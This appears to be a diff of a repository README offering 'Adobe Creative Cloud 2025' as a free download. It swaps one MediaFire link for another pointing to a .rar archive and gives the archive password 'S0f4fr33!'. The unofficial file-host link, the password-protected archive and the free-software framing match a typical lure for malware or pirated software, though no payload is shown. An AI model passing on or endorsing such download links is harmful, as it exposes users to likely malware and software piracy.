@@ -1,5 +1,5 @@
 # Adobe-Creative-Cloud-2025
-[Click Here to Download](https://www.mediafire.com/file/6d9bwwiliouz9yl/AdobeCreative_cloud_Win_Install.zip/file)
+[Click Here to Download](https://www.mediafire.com/file/x05jxkgbr1azcmo/Adobe_Creative_Cloud_Win64.rar/file)
 [Pass: S0f4fr33!]
 
 BUSINESS Creative Cloud
